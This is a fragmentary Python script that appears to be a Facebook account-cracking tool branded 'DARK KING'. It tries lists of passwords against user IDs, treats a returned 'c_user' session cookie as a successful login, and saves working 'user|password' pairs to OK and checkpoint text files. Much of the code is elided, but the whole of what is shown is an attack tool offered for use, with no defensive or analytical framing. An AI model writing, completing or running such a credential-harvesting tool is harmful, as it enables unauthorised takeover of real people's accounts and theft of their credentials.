...
GITHUB    : 𝐃𝐀𝐑𝐊𝐊𝐈𝐍𝐆𝐂𝐘𝐁𝐄𝐑𝟕𝟏

FACEBOOK  : 𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆 

TOOL NAME : 𝐅𝐈𝐋𝐄 𝐂𝐎𝐋𝐎𝐍  
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆_OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆_CP.txt' % (H, P, str(len(cp))))
...
class __xxx__:
    ...
    def alaminx(self,id):
        ...
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            ...
            print(' [𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆] Choose Correct One');
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;97m[𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-OK] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-CP] %s | %s ' % (M, user, pw))

                        wrt = '%s|%s' % (user,pw)

                        cp.append(wrt)

                        open('𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆_CP.txt' , 'a').write('%s\n' % wrt)
